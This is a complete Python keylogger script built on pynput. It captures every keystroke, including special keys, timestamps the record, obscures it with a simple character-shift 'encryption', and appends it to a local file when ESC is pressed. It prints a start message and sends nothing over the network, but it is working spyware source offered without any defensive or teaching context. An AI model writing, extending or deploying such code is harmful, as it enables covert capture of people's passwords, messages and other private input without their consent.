from pynput import keyboard
from datetime import datetime
import os

def encrypt_logs(func):
    def wrapper(*args, **kwargs):
        log_data = func(*args, **kwargs)
        encrypted = ''.join([chr((ord(char) + 3) % 256) for char in log_data])  
        return encrypted
    return wrapper

class Logger:
    def __init__(self, log_file="key_log.txt"):
        self.log_file = log_file
        self.logs = ""

    def start(self):
        print("Keylogger started. Press ESC to stop.")

        try:
            with keyboard.Listener(on_press=self._on_press) as listener:
                listener.join()
        except Exception as e:
            print(f"[Error] Keyboard listener failed: {e}")

    def _on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char:
                self.logs += key.char
            else:
                self.logs += f"[{key.name}]"

            if key == keyboard.Key.esc:
                self._save_logs()
                return False
        except Exception as e:
            print(f"[Error] Key press error: {e}")

    @encrypt_logs
    def _get_log_data(self):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        return f"\n\n--- Log started at {timestamp} ---\n{self.logs}\n"

    def _save_logs(self):
        try:
            with open(self.log_file, "a", encoding='utf-8') as f:
                f.write(self._get_log_data())
            print(f"Logs saved to {self.log_file}")
        except Exception as e:
            print(f"[Error] Could not save logs: {e}")

if __name__ == "__main__":
    logger = Logger()
    logger.start()
